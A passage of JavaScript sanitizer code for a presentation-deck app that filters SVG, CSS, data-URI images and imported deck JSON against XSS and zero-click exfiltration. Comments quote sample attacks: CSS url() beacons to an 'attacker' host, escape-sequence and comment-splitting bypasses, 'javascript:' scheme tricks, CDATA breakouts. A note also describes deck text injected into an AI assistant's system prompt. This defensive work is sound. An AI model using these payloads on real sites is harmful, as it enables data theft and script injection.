]);

// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
// render — zero-click exfil beacon with no CSP backstop inside the artifact
// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
// markers, gradients, clip-paths) and reject everything else that can hit
// the network or use legacy code-execution constructs. CSS \XX escape
// sequences can decode "url" / "@import" past a literal-token regex
// (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
// Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
// payloads slipped through child node types (CDATA/comment/PI), see v12.52.
function isSvgStyleSafe(css) {
  if (typeof css !== "string" || css.length > 5000) return false;
  if (css.indexOf("\\") !== -1) return false;
  if (css.indexOf("<") !== -1) return false;
  if (css.indexOf("]]>") !== -1) return false;
  // Reject any CSS comment. CSS permits a comment (not just whitespace) as a token
  // separator between a function name and its '('/quoted argument; the fnStr/url()
  // checks below assume only whitespace, so a comment could split the token and let
  // a string-source URL through — a zero-click exfil beacon on render. Legit Vela
  // paint CSS never needs comments; reject outright, mirroring the backslash reject
  // above. (Pairs with the same reject in STYLE_VALUE_REJECT.)
  if (css.indexOf("/*") !== -1) return false;
  if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
  const urls = css.match(/url\s*\([^)]*\)/gi);
  if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
  // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
  // image()/cross-fade()/src() (and any future image-ish function) take a bare
  // "https://…" string with NO url() token, so the url() check above misses them
  // — a zero-click outbound GET (CSS-exfil beacon) on render. This shape
  // (function-name + quote) is only ever a URL-by-string in CSS values:
  // rgb()/calc()/var()/translate() never take strings, and font-family:"X" is a
  // bare value, not a call. url(…) is the sole legitimate string-taking function
  // and is already validated to be a #fragment above. Function-name-agnostic, so
  // functions that don't exist yet cannot reopen this. Closes the residual
  // image-set() bypass of the v12.53 url() exfil fix.
  const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
  if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
  return true;
}

function sanitizeSvgMarkup(raw) {
  if (typeof raw !== "string") return "";
  try {
    const doc = new DOMParser().parseFromString(`<svg xmlns="http://www.w3.org/2000/svg">${raw}</svg>`, "image/svg+xml");
    const err = doc.querySelector("parsererror");
    if (err) return "";
    const walk = (node) => {
      const children = Array.from(node.childNodes);
      for (const child of children) {
        // Keep only element (1) and text (3) nodes. Drop comment (8), CDATA (4) and
        // processing-instruction (7) nodes: they serialize literally (unescaped), so a
        // smuggled </style></title></text> inside CDATA breaks out of rawtext when the
        // serialized string is re-parsed as HTML by dangerouslySetInnerHTML (mutation XSS).
        if (child.nodeType !== 1 && child.nodeType !== 3) { child.remove(); continue; }
        if (child.nodeType === 1) {
          const tag = child.localName.toLowerCase();
          // SECURITY (v12.54): allowlist — anything not explicitly known-safe is removed.
          // Replaces the previous SVG_BLOCKED_TAGS blocklist (inherently incomplete).
          if (!SVG_ALLOWED_TAGS.has(tag)) { child.remove(); continue; }
          if (tag === "style") {
            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>).
            // SECURITY (v12.52): we MUST still descend so the nodeType filter above
            // strips any CDATA/comment/PI children. CDATA serializes literally and
            // a smuggled `</style>` inside it escapes rawtext when re-parsed as HTML
            // by dangerouslySetInnerHTML, yielding a live <img onerror=...>.
            walk(child);
            continue;
          }
          const attrs = Array.from(child.attributes);
          for (const a of attrs) {
            const name = a.name.toLowerCase();
            if (name.startsWith("on")) { child.removeAttribute(a.name); continue; }
            // src/srcset never appear on legitimate SVG elements (SVG uses href/
            // xlink:href), so they survive the SVG parse inert — but the sanitized
            // string is later parsed in an HTML context (dangerouslySetInnerHTML into a
            // <div>), where <image> is the HTML alias for <img> and src/srcset become a
            // zero-click external fetch on render. Strip them outright. (v12.62)
            if (name === "src" || name === "srcset") { child.removeAttribute(a.name); continue; }
            // SECURITY: href/xlink:href are ALLOWLIST after DOMParser normalization.
            // Entities (&#x3a;, &#58;, &#115;) are already decoded by the parser; we strip
            // ASCII control/whitespace (browsers ignore them inside a scheme — "java\tscript:"
            // is "javascript:"), then check via fixed allowlists. Mixed-case is folded by
            // toLowerCase(). Blocklist alone would let file:, blob:, chrome:, intent:, etc.
            if (name === "href" || name === "xlink:href") {
              const norm = a.value.replace(/[\u0000-\u0020]+/g, "");
              const lower = norm.toLowerCase();
              // <a href> = BUCKET B (click nav): http/https/mailto/tel only.
              // Every OTHER href/xlink:href (image/feImage/use/tref/altGlyph/…) =
              // BUCKET A (auto-fetched on render): same-document #fragment ONLY — no
              // external, no data:, no blob:. Vela decks load nothing external. Closes
              // <feImage href> (Roundcube-class) + external <image href> zero-click
              // beacons the old http/https allowance left open on non-anchors. (v12.59)
              if (name === "href" && tag === "a") {
                const m = norm.match(/^([a-z][a-z0-9+\-.]*):/i);
                if (m && !["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())) { child.removeAttribute(a.name); continue; }
              } else if (!lower.startsWith("#")) {
                child.removeAttribute(a.name); continue;
              }
            }
            const val = a.value.trim().toLowerCase();
            // Scheme check ignores ASCII whitespace/control chars (browsers strip tab/newline/CR inside URL schemes — "java\tscript:" === "javascript:")
            const scheme = a.value.replace(/[\u0000-\u0020]+/g, "").toLowerCase();
            if ((name === "href" || name === "xlink:href") && (scheme.startsWith("javascript:") || scheme.startsWith("data:") || scheme.startsWith("vbscript:"))) { child.removeAttribute(a.name); continue; }
            if (name === "xlink:href" && !val.startsWith("#")) { child.removeAttribute(a.name); continue; }
            // BUCKET A — CSS / presentation references that auto-fetch on render:
            // style="…" plus paint/filter/mask/marker/clip-path/cursor attributes.
            // isSvgStyleSafe allows only url(#fragment); rejects external url(),
            // image-set()/image()/cross-fade()/src() string sources, @import and CSS-
            // escape obfuscation. Supersedes the prior style-only js/data check. (v12.59)
            if (SVG_URL_REF_ATTRS.has(name) && !isSvgStyleSafe(a.value)) { child.removeAttribute(a.name); continue; }
          }
          walk(child);
        }
      }
    };
    const root = doc.documentElement;
    walk(root);
    // The sanitized markup is injected via dangerouslySetInnerHTML into an HTML
    // <div>. If the returned string is not SVG-scoped at the top level, the HTML
    // parser runs in HTML insertion mode, where <image> is the spec alias for <img>
    // (and other SVG tags can HTML-alias) — turning deck-supplied content into a
    // zero-click outbound fetch even after attribute filtering. A deck that supplied
    // its own single <svg> root is returned verbatim (renders unchanged); anything
    // else keeps our <svg> wrapper so the sink always parses it in SVG foreign-content
    // scope, neutralizing HTML-aliasing for the whole tag class. (v12.62)
    if (!root.innerHTML.trim()) return "";
    const top = Array.from(root.children);
    if (top.length === 1 && (top[0].localName || "").toLowerCase() === "svg") {
      return top[0].outerHTML;
    }
    return root.outerHTML;
  } catch (_) { return ""; }
}

// Inline data: images for image-block src / slide bgImage / branding logo.
// Raster types are inert in an <img>. data:image/svg+xml is LIVE SVG — the same
// markup the dedicated svg block routes through sanitizeSvgMarkup — so it gets
// the identical decode -> sanitize -> re-encode treatment here rather than
// relying on the browser's <img> SVG sandbox (the only thing that stops a deck
// SVG's external <image>/<style url()> from firing in a non-sandboxed context
// such as the local dev server / a desktop webview). Non-image data: types are
// dropped (a stricter, consistent allowlist than the prior data:-only logo rule).
// Raster branch is END-ANCHORED to a pure base64 payload: a prefix-only test let
// arbitrary trailing bytes ride along on the value, which then broke out of an
// unquoted CSS url() at a background sink. Anchoring to `;base64,<base64>$` means
// nothing can follow the image data, so the validated string is safe to return
// as-is. (The bare `data:image/<t>,<raw>` form is intentionally no longer accepted
// here — real decks always use base64; the raw form was the risky path.)
const SAFE_RASTER_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp);base64,[A-Za-z0-9+/]+={0,2}$/i;
function sanitizeImageDataUri(s) {
  if (typeof s !== "string" || !s) return "";
  if (SAFE_RASTER_DATA_IMAGE.test(s)) return s;
  const m = /^data:image\/svg\+xml([^,]*)?,/i.exec(s);
  if (!m) return "";
  const meta = m[1] || "";
  let markup;
  try {
    markup = /;base64/i.test(meta) ? atob(s.slice(m[0].length)) : decodeURIComponent(s.slice(m[0].length));
  } catch (_) { return ""; }
  const clean = sanitizeSvgMarkup(markup);
  if (!clean || !/<svg[\s>]/i.test(clean)) return "";
  return "data:image/svg+xml," + encodeURIComponent(clean);
}

// SECURITY (audit 2025-05, H2): block.style was previously typecheck-only,
// which let a deck (or a Vera prompt-injected tool call) ship CSS values
// like `backgroundImage: url('https://attacker/?d=...')`. Inline styles
// fire an outbound GET on every render with no CSP backstop inside the
// artifact srcdoc — a zero-click data-exfil channel. We now apply both an
// allowlist of safe CSS keys (text/layout/color, no image-loading) AND a
// value filter that rejects url() / expression() / any string-source CSS
// function (image-set()/image()/cross-fade()/src(), name-agnostic) / bare
// scheme / @import / CSS escapes / angle brackets, even on allowlisted keys.
// This is the single canonical CSS external-load/breakout value filter — it is
// reused by scrubColorFields() for the slide/block color scalars, so the two
// surfaces can never drift apart. (SVG CSS uses isSvgStyleSafe() instead, which
// is deliberately distinct: it must ALLOW same-document url(#fragment) paint
// servers, which have no meaning — and so stay rejected — here.)
const SAFE_STYLE_KEYS = new Set([
  // text
  "color", "fontWeight", "fontStyle", "fontSize", "fontFamily",
  "letterSpacing", "lineHeight", "textAlign", "textTransform",
  "textDecoration", "whiteSpace", "wordBreak", "overflowWrap",
  // layout
  "display", "flexDirection", "alignItems", "justifyContent", "gap",
  "padding", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
  "margin", "marginTop", "marginRight", "marginBottom", "marginLeft",
  "width", "height", "minWidth", "minHeight", "maxWidth", "maxHeight",
  "boxSizing", "flex", "flexGrow", "flexShrink", "flexBasis", "flexWrap",
  "gridTemplateColumns", "gridTemplateRows", "gridColumn", "gridRow",
  // box
  "backgroundColor", "borderRadius",
  "borderTop", "borderRight", "borderBottom", "borderLeft",
  "borderColor", "borderStyle", "borderWidth",
  "boxShadow", "opacity",
]);
// Trailing `\/\*` rejects any CSS comment: CSS allows a comment (not just the
// `\s*` whitespace this regex's fnStr clause assumes) as a token separator between
// a function name and its '('/quoted argument, which could otherwise split the
// token and let a string-source URL slip past the function-string and `://` checks
// — a zero-click exfil beacon on render. Color/gradient/layout values never contain
// a comment; reject outright (pairs with the same reject in isSvgStyleSafe).
const STYLE_VALUE_REJECT = /url\s*\(|expression\s*\(|@import|:\/\/|[a-z][\w-]*\s*\(\s*['"]|<|\\|\/\*/i;
function sanitizeStyle(style) {
  if (!style || typeof style !== "object" || Array.isArray(style)) return undefined;
  const out = {};
  for (const k of Object.keys(style)) {
    if (!SAFE_STYLE_KEYS.has(k)) continue;
    const v = style[k];
    if (typeof v === "number" && Number.isFinite(v)) { out[k] = v; continue; }
    if (typeof v === "string") {
      if (v.length > 200) continue;
      if (STYLE_VALUE_REJECT.test(v)) continue;
      out[k] = v;
    }
  }
  return out;
}

// Slide- and block-level color/background scalars (bg, color, accent, border,
// dotColor, headerBg, trackColor, cell.bg …) are written straight into inline
// CSS — `background`, `background-image`, `color`, `border`, `fill` — at render
// (e.g. backgroundImage = `url(${slide.bgImage})`). Unlike block.style they never
// passed through sanitizeStyle, so a value like `url(https://x)` fired a
// zero-click outbound GET on render (CSS auto-load exfil beacon — same class as
// the SVG/img holes closed in v12.59, different surface). Vela decks load NOTHING
// external: legit values here are colors and gradients, which need no url(), no
// quoted string-source function (image()/image-set()/cross-fade()/src()), and no
// bare URL. Reuse the canonical STYLE_VALUE_REJECT (defined above) so this surface
// and block.style share ONE filter and can't drift apart. bgImage (a background
// *image*) is clamped to data:image/* separately, like the image block / logo.
const CSS_COLOR_KEY = /^(bg|color|accent|fill|stroke|border)$|(Color|Bg|Border|Gradient|Fill|Stroke)$/;
function scrubColorFields(obj) {
  if (!obj || typeof obj !== "object") return;
  for (const k of Object.keys(obj)) {
    const v = obj[k];
    if (typeof v !== "string" || !CSS_COLOR_KEY.test(k)) continue;
    if (v.length > 500 || STYLE_VALUE_REJECT.test(v)) delete obj[k];
  }
}

// Companion to scrubColorFields for the non-color LAYOUT/SIZING scalars that a
// few block renderers spread raw into inline style (e.g. grid cell padding /
// borderRadius, svg/heading/text maxWidth, gap, spacing). These reach CSS
// properties that don't accept a url()/image source, so they are not a live
// auto-load sink today — but scrub the same primitives anyway so a future
// renderer change can't promote one into a leak. Legitimate values ("12px",
// "100%", "16px 20px", "calc(100% - 8px)") never match STYLE_VALUE_REJECT, so
// this is feature-transparent. (v12.71)
const CSS_LAYOUT_KEY = /^(padding|margin|gap|spacing|borderRadius|borderWidth|maxWidth|maxHeight|minWidth|minHeight|width|height|inset|top|left|right|bottom)$/;
function scrubLayoutFields(obj) {
  if (!obj || typeof obj !== "object") return;
  for (const k of Object.keys(obj)) {
    const v = obj[k];
    if (typeof v !== "string" || !CSS_LAYOUT_KEY.test(k)) continue;
    if (v.length > 500 || STYLE_VALUE_REJECT.test(v)) delete obj[k];
  }
}

// CSS-context output encoders for deck values interpolated into inline CSS at
// render (a `url(...)` position or a bare color token). The value-level allowlists
// above decide WHAT is allowed; these ensure a value cannot break out of its CSS
// context — defense-in-depth so any future/missed value still can't append a second
// (external) background layer. cssUrl quotes + escapes so the value stays a single
// url() string; cssColor passes only a strict color token (else empty, caller falls
// back to a default). Neither permits a bare external URL on its own.
function cssUrl(u) {
  return 'url("' + String(u == null ? "" : u).replace(/[\\"]/g, "\\$&").replace(/[\n\r\f]/g, "") + '")';
}
const CSS_COLOR_OK = /^#[0-9a-f]{3,8}$|^(?:rgb|rgba|hsl|hsla)\([0-9.,%\s/]+\)$|^[a-z]+$/i;
function cssColor(c) {
  const v = String(c == null ? "" : c).trim();
  return (CSS_COLOR_OK.test(v) && !/url\(|\/\*|[<>]/i.test(v)) ? v : "";
}

function sanitizeBlock(block) {
  if (!block || typeof block !== "object" || Array.isArray(block)) return null;
  if (!SAFE_BLOCK_TYPES.has(block.type)) return null;
  const clean = { ...block };
  // `hidden` (element visibility toggle) — coerce to a strict boolean so a
  // non-boolean value can never reach layout/render logic.
  if ("hidden" in clean) { if (clean.hidden === true) clean.hidden = true; else delete clean.hidden; }
  if (clean.text) clean.text = sanitizeString(clean.text, 2000);
  if (clean.content) clean.content = sanitizeString(clean.content, 2000);
  if (clean.label) clean.label = sanitizeString(clean.label, 200);
  if (clean.caption) clean.caption = sanitizeString(clean.caption, 500);
  if (clean.author) clean.author = sanitizeString(clean.author, 200);
  if (clean.value) clean.value = sanitizeString(String(clean.value), 100);
  if (clean.title) clean.title = sanitizeString(clean.title, 500);
  if (clean.link) clean.link = sanitizeUrl(clean.link);
  // Image block <img src> auto-fetches on render. Vela decks load nothing
  // external, so restrict to inline data:image/* (no network, no data:text/html).
  // Mirrors the branding-logo rule (data:-only). (v12.59)
  if (clean.src && clean.type === "image") {
    clean.src = sanitizeImageDataUri(sanitizeUrl(clean.src, ["data:"]));
  }
  if (Array.isArray(clean.items)) {
    if (clean.type === "bullets") {
      clean.items = clean.items.slice(0, 50).map((it) =>
        typeof it === "string" ? sanitizeString(it, 1000) : typeof it === "object" && it.text ? { text: sanitizeString(it.text, 1000), ...(it.icon ? { icon: it.icon } : {}), ...(it.link ? { link: sanitizeUrl(it.link) } : {}) } : ""
      );
    }
    if (clean.type === "grid") {
      clean.items = clean.items.slice(0, 6).map((cell) => ({
        ...cell,
        blocks: Array.isArray(cell?.blocks) ? cell.blocks.map(sanitizeBlock).filter(Boolean) : [],
      }));
    }
    if (clean.type === "icon-row") {
      clean.items = clean.items.slice(0, 20).map((it) => {
        if (typeof it === "string") return sanitizeString(it, 500);
        if (!it || typeof it !== "object") return null;
        const c = { ...it };
        if (c.text) c.text = sanitizeString(c.text, 500);
        if (c.label) c.label = sanitizeString(c.label, 200);
        if (c.value) c.value = sanitizeString(String(c.value), 100);
        if (c.link) c.link = sanitizeUrl(c.link);
        return c;
      }).filter(Boolean);
    }
    if (clean.type === "flow" || clean.type === "steps" || clean.type === "timeline" || clean.type === "tag-group" || clean.type === "funnel" || clean.type === "cycle" || clean.type === "number-row" || clean.type === "checklist") {
      clean.items = clean.items.slice(0, 20).map((it) => {
        if (!it || typeof it !== "object") return null;
        const c = { ...it };
        if (c.label) c.label = sanitizeString(c.label, 200);
        if (c.title) c.title = sanitizeString(c.title, 500);
        if (c.text) c.text = sanitizeString(c.text, 1000);
        if (c.date) c.date = sanitizeString(c.date, 50);
        if (c.link) c.link = sanitizeUrl(c.link);
        return c;
      }).filter(Boolean);
    }
    if (clean.type === "progress") {
      clean.items = clean.items.slice(0, 20).map((it) => {
        if (!it || typeof it !== "object") return null;
        const c = { ...it };
        if (c.label) c.label = sanitizeString(c.label, 200);
        if (typeof c.value === "number") c.value = Math.max(0, Math.min(c.value, 100));
        return c;
      }).filter(Boolean);
    }
    if (clean.type === "comparison" || clean.type === "matrix") {
      clean.items = clean.items.slice(0, 4).map((it) => {
        if (!it || typeof it !== "object") return null;
        const c = { ...it };
        if (c.title) c.title = sanitizeString(c.title, 200);
        if (Array.isArray(c.items)) c.items = c.items.slice(0, 10).map((pt) => {
          if (typeof pt === "string") return sanitizeString(pt, 500);
          if (pt && typeof pt === "object" && pt.text) {
            const p2 = { ...pt, text: sanitizeString(pt.text, 500) };
            // Defense-in-depth (v12.67): nested comparison/matrix points aren't spread into
            // inline CSS today, but scrub style/color so a future renderer change can't leak.
            if ("style" in p2) { const ps = sanitizeStyle(p2.style); if (ps && Object.keys(ps).length) p2.style = ps; else delete p2.style; }
            scrubColorFields(p2);
            scrubLayoutFields(p2);
            return p2;
          }
          return "";
        });
        return c;
      }).filter(Boolean);
    }
  }
  if (clean.type === "table") {
    if (Array.isArray(clean.headers)) clean.headers = clean.headers.slice(0, 10).map((h) => sanitizeString(String(h), 200));
    if (Array.isArray(clean.rows)) clean.rows = clean.rows.slice(0, 30).map((row) =>
      Array.isArray(row) ? row.slice(0, 10).map((cell) => sanitizeString(String(cell), 500)) : []
    );
  }
  if (clean.type === "svg") {
    // DOM-based sanitization (same pipeline as study-notes/chat diagrams). The previous
    // regex chain was bypassable: unquoted and whitespace-obfuscated javascript:/data: URIs
    // in href/xlink:href survived it, yielding stored XSS on click.
    clean.markup = typeof clean.markup === "string" ? sanitizeSvgMarkup(clean.markup.slice(0, 50000)) : "";
  }
  // Guard: style must be allowlisted CSS keys with non-url values — see
  // sanitizeStyle (audit 2025-05, H2 CSS-exfil fix).
  if ("style" in clean) {
    const s = sanitizeStyle(clean.style);
    if (s && Object.keys(s).length) clean.style = s;
    else delete clean.style;
  }
  if (Array.isArray(clean.items)) {
    clean.items = clean.items.map(it => {
      if (it && typeof it === "object" && "style" in it) {
        const s = sanitizeStyle(it.style);
        const c = { ...it };
        if (s && Object.keys(s).length) c.style = s;
        else delete c.style;
        return c;
      }
      return it;
    });
  }
  // Strip CSS auto-load values from color/background scalars on the block and on
  // every item object (flow/icon-row/grid cell/etc. — cell.bg, cell.border,
  // item.color, dotColor …). See scrubColorFields above. (v12.61)
  scrubColorFields(clean);
  scrubLayoutFields(clean);
  if (Array.isArray(clean.items)) {
    for (const it of clean.items) { scrubColorFields(it); scrubLayoutFields(it); }
  }
  // The matrix block renders from a separate `quadrants` array (not `items`),
  // so its per-quadrant color scalar must be scrubbed too. (Same CSS auto-load
  // class as items; quadrants was previously never visited.)
  if (Array.isArray(clean.quadrants)) {
    for (const q of clean.quadrants) { scrubColorFields(q); scrubLayoutFields(q); }
  }
  return clean;
}

const VALID_COMMENT_STATUSES = new Set(["open", "resolved"]);
const MAX_COMMENTS = 500;

function sanitizeComment(c) {
  if (!c || typeof c !== "object") return null;
  return {
    id: typeof c.id === "string" ? c.id.slice(0, 40) : "c_" + uid(),
    text: sanitizeString(c.text || "", 1000),
    anchor: typeof c.anchor === "string" ? sanitizeString(c.anchor, 200) : null,
    blockIndex: typeof c.blockIndex === "number" ? c.blockIndex : null,
    status: VALID_COMMENT_STATUSES.has(c.status) ? c.status : "open",
    createdAt: typeof c.createdAt === "string" ? c.createdAt.slice(0, 30) : now(),
    resolvedAt: typeof c.resolvedAt === "string" ? c.resolvedAt.slice(0, 30) : null,
  };
}

// ━━━ Offline Study Notes sanitizer ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Slide-level `studyNotes` field: pre-authored student-mode content that renders
// with zero API calls. Shape: { text, diagram?, questions?, glossary? }.
// Rich text (parseInline), inline X-Ray links ([label](url) + [term](#key)),
// optional inline SVG diagram, up to 6 follow-up questions, and a glossary map.
function sanitizeStudyNotes(raw) {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return undefined;
  const out = {};
  if (typeof raw.text === "string") {
    const t = sanitizeString(raw.text, 4000);
    if (t) out.text = t;
  }
  if (!out.text) return undefined; // text is required; drop the whole block otherwise
  if (typeof raw.diagram === "string" && raw.diagram.trim()) {
    const svg = sanitizeSvgMarkup(raw.diagram.slice(0, 8000));
    if (svg) out.diagram = svg;
  }
  if (Array.isArray(raw.questions)) {
    const qs = raw.questions.slice(0, 6)
      .map((q) => sanitizeString(typeof q === "string" ? q : String(q || ""), 160))
      .filter((q) => q.length > 0);
    if (qs.length) out.questions = qs;
  }
  if (raw.glossary && typeof raw.glossary === "object" && !Array.isArray(raw.glossary)) {
    const gl = {};
    let count = 0;
    for (const [k, v] of Object.entries(raw.glossary)) {
      if (count >= 24) break;
      if (typeof k !== "string" || !v || typeof v !== "object") continue;
      const key = k.toLowerCase().replace(/[^\w\-]/g, "").slice(0, 48);
      if (!key) continue;
      const def = sanitizeString(typeof v.definition === "string" ? v.definition : "", 400);
      if (!def) continue;
      const entry = { definition: def };
      if (typeof v.url === "string" && v.url.trim()) {
        const safe = sanitizeUrl(v.url.trim());
        if (safe) entry.url = safe;
      }
      gl[key] = entry;
      count++;
    }
    if (Object.keys(gl).length) out.glossary = gl;
  }
  return out;
}

function sanitizeSlide(slide) {
  if (!slide || typeof slide !== "object") return null;
  const clean = { ...slide };
  // `hidden` (slide excluded from presentation/counts) — strict boolean only.
  if ("hidden" in clean) { if (clean.hidden === true) clean.hidden = true; else delete clean.hidden; }
  if (Array.isArray(clean.blocks)) clean.blocks = clean.blocks.slice(0, 30).map(sanitizeBlock).filter(Boolean);
  if (Array.isArray(clean.L)) clean.L = clean.L.slice(0, 30).map(sanitizeBlock).filter(Boolean);
  if (Array.isArray(clean.R)) clean.R = clean.R.slice(0, 30).map(sanitizeBlock).filter(Boolean);
  if (clean.title) clean.title = sanitizeString(clean.title, 500);
  if (clean.subtitle) clean.subtitle = sanitizeString(clean.subtitle, 500);
  if (clean.quote) clean.quote = sanitizeString(clean.quote, 2000);
  if (clean.author) clean.author = sanitizeString(clean.author, 200);
  if (Array.isArray(clean.bullets)) clean.bullets = clean.bullets.slice(0, 30).map((b) => sanitizeString(String(b), 1000));
  if (Array.isArray(clean.comments)) clean.comments = clean.comments.slice(0, MAX_COMMENTS).map(sanitizeComment).filter(Boolean);
  if (clean.studyNotes) {
    const sn = sanitizeStudyNotes(clean.studyNotes);
    if (sn) clean.studyNotes = sn; else delete clean.studyNotes;
  }
  // Slide background/color scalars (bg, bgGradient, color, accent, mutedColor)
  // feed inline CSS directly — scrub CSS auto-load values. See scrubColorFields. (v12.61)
  scrubColorFields(clean);
  // bgImage is a background *image* (auto-fetches on render). Restrict to inline
  // data:image/* — no network — matching the image block / branding-logo rule.
  if ("bgImage" in clean) {
    const s = typeof clean.bgImage === "string" ? sanitizeImageDataUri(sanitizeUrl(clean.bgImage, ["data:"])) : "";
    if (s) clean.bgImage = s; else delete clean.bgImage;
  }
  return clean;
}

function sanitizeItem(item) {
  if (!item || typeof item !== "object") return null;
  const comments = Array.isArray(item.comments) ? item.comments.slice(0, MAX_COMMENTS).map(sanitizeComment).filter(Boolean) : [];
  // Migrate legacy notes to a module-level comment if no comments exist
  if (comments.length === 0 && typeof item.notes === "string" && item.notes.trim()) {
    comments.push({ id: "c_" + uid(), text: sanitizeString(item.notes.trim(), 1000), anchor: null, blockIndex: null, status: "open", createdAt: now(), resolvedAt: null });
  }
  return {
    id: uid(),
    title: sanitizeString(item.title || "Untitled", 200),
    notes: typeof item.notes === "string" ? sanitizeString(item.notes, 2000) : "",
    comments,
    status: VALID_STATUSES.has(item.status) ? item.status : "todo",
    importance: VALID_IMPORTANCES.has(item.importance) ? item.importance : "should",
    order: typeof item.order === "number" ? item.order : 0,
    slides: Array.isArray(item.slides) ? item.slides.slice(0, 100).map(sanitizeSlide).filter(Boolean) : [],
    createdAt: typeof item.createdAt === "string" ? item.createdAt.slice(0, 30) : now(),
    ...(item.presentCard ? { presentCard: true } : {}),
  };
}

function validateAndSanitizeDeck(raw) {
  if (!raw || typeof raw !== "object") throw new Error("Invalid deck format");
  if (!Array.isArray(raw.lanes)) throw new Error("Missing lanes array");
  // Clamp rather than throw: a >50-lane deck must not be able to trip an exception
  // that a fail-open caller would catch and then load raw, unsanitized (sanitizer off-switch).
  const lanes = raw.lanes.slice(0, 50).map((lane) => {
    if (!lane || typeof lane !== "object") return null;
    const items = Array.isArray(lane.items) ? lane.items.slice(0, 200).map(sanitizeItem).filter(Boolean) : [];
    return { id: uid(), title: sanitizeString(lane.title || "Untitled", 100), collapsed: !!lane.collapsed, items };
  }).filter(Boolean);
  const rawBranding = raw.branding && typeof raw.branding === "object" ? raw.branding : {};
  const importedBranding = {
    ...defaultBranding,
    enabled: !!rawBranding.enabled,
    accentBar: rawBranding.accentBar !== false,
    accentColor: sanitizeString(rawBranding.accentColor || "#3B82F6", 20),
    accentHeight: typeof rawBranding.accentHeight === "number" ? Math.min(rawBranding.accentHeight, 20) : 4,
    logo: sanitizeImageDataUri(typeof rawBranding.logo === "string" ? sanitizeUrl(rawBranding.logo, ["data:"]) : "") || null,
    logoPosition: ["top-left", "top-right", "bottom-left", "bottom-right"].includes(rawBranding.logoPosition) ? rawBranding.logoPosition : "top-left",
    logoSize: typeof rawBranding.logoSize === "number" ? Math.min(rawBranding.logoSize, 120) : 56,
    footerLeft: sanitizeString(rawBranding.footerLeft || "", 100),
    footerCenter: sanitizeString(rawBranding.footerCenter || "", 100),
    footerRight: sanitizeString(rawBranding.footerRight || "auto", 100),
    footerBg: sanitizeString(rawBranding.footerBg || "rgba(0,0,0,0.35)", 50),
    footerColor: sanitizeString(rawBranding.footerColor || "#94a3b8", 20),
    footerSize: typeof rawBranding.footerSize === "number" ? Math.min(rawBranding.footerSize, 16) : 9,
    imgMaxWidth: typeof rawBranding.imgMaxWidth === "number" ? Math.max(300, Math.min(rawBranding.imgMaxWidth, 960)) : 600,
    imgQuality: typeof rawBranding.imgQuality === "number" ? Math.max(0.15, Math.min(rawBranding.imgQuality, 0.85)) : 0.45,
  };
  // Branding color scalars (accentColor, footerBg, footerColor) feed inline CSS;
  // sanitizeString only strips tags/truncates and would pass a short url(...) —
  // scrub them like every other color field. logo is sanitized as an inline
  // data: image (raster passthrough, svg routed through sanitizeSvgMarkup). (v12.63)
  scrubColorFields(importedBranding);
  // guidelines is deck-supplied text injected into the Vera system prompt. Strip
  // control chars (defense-in-depth: no smuggled NUL/bidi/format scaffolding) and
  // cap length. NOTE: this is not a complete prompt-injection defense — the field
  // is by design honored by the model; treat third-party decks accordingly.
  const importedGuidelines = typeof raw.guidelines === "string"
    ? raw.guidelines.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\ufeff]/g, "").slice(0, 2000)
    : "";
  return { lanes, guidelines: importedGuidelines, selectedId: null, slideIndex: 0, fullscreen: VELA_PRESENTATION_MODE, chatOpen: false,
    chatMessages: [{ role: "assistant", content: "Deck imported successfully! Ready to sail. ⛵🖖", ts: now() }],
    chatLoading: false, lastDebug: "", branding: importedBranding };
}

// ━━━ Image Compression ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function compressImage(dataUrl, maxWidth = 800, quality = 0.7) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      let w = img.width, h = img.height;
      if (w > maxWidth) { h = Math.round(h * maxWidth / w); w = maxWidth; }
      const c = document.createElement("canvas");
      c.width = w; c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      resolve(c.toDataURL("image/jpeg", quality));
    };
    img.onerror = () => resolve(dataUrl);
    img.src = dataUrl;
  });
}

let IMG_SETTINGS = { maxWidth: defaultBranding.imgMaxWidth, quality: defaultBranding.imgQuality };
const compressSlideImage = (dataUrl) => compressImage(dataUrl, IMG_SETTINGS.maxWidth, IMG_SETTINGS.quality);

// Natural aspect ratio (width / height) of a data URL image. Resolves 1 on error
// so callers can treat undecodable images as square. Used by paste heuristics to
// decide stacked-vs-side-by-side layout (wide images read better stacked below).
const imageAspect = (dataUrl) => new Promise((resolve) => {
  const img = new Image();
  img.onload = () => resolve(img.height ? img.width / img.height : 1);
  img.onerror = () => resolve(1);
  img.src = dataUrl;
});

// Decide the layout for a slide an image is being pasted onto. Returns the layout
// the slide should carry: an explicit author layout is preserved; an empty/mostly-
// title slide or a wide landscape image (aspect >= 1.6, e.g. screenshots) stacks
// the image below ("stack"); otherwise the slide is promoted to "image-right" so
// the image sits beside the existing body content. aspect = image width / height.
const PASTE_TITLE_BLOCKS = new Set(["heading", "text", "subtitle", "badge", "quote"]);
function pasteImageLayout(slide, aspect) {
  const layout = slide && slide.layout;
  if (layout && layout !== "stack") return layout; // respect explicit author layout
